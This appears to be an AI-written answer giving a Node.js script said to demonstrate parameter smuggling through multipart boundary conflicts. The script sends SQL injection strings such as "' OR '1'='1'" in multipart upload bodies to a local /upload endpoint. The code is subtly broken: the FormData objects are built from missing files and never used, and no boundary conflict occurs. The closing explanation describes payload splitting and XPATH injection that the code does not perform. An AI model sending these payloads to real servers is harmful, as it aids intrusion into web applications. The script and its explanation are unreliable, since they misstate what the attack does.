Here's an example of Node.js code that demonstrates parameter smuggling via Content-Type multipart boundary conflicts:

```javascript
const http = require('http');
const fs = require('fs');
const FormData = require('form-data');

const boundary = '--------------------------884620858834402565792898';
const payload1 = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="payload1.txt"\r\nContent-Type: text/plain\r\n\r\nSELECT * FROM users; --\r\n--${boundary}--`;
const payload2 = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="payload2.txt"\r\nContent-Type: text/plain\r\n\r\n' OR '1'='1'; --\r\n--${boundary}--`;

const form1 = new FormData();
form1.append('file', fs.createReadStream('payload1.txt'));
const form2 = new FormData();
form2.append('file', fs.createReadStream('payload2.txt'));

const options = {
  hostname: 'localhost',
  port: 3000,
  path: '/upload',
  method: 'POST',
  headers: {
    'Content-Type': `multipart/form-data; boundary=${boundary}`,
    'Content-Length': Buffer.byteLength(payload1) + Buffer.byteLength(payload2)
  }
};

const req = http.request(options, (res) => {
  let data = '';
  res.on('data', (chunk) => {
    data += chunk;
  });
  res.on('end', () => {
    console.log(data);
  });
});

req.on('error', (e) => {
  console.error(`Problem with request: ${e.message}`);
});

req.write(payload1);
req.write(payload2);
req.end();
```

In this example, we are creating two payloads with SQL/XPATH injections split between the part headers and binary payloads. We then create two FormData instances and append the payloads as files. We set the Content-Type header to include the multipart boundary and send the requests to the server. This code can be used to demonstrate parameter smuggling via Content-Type multipart boundary conflicts and the potential security vulnerabilities it can lead to.
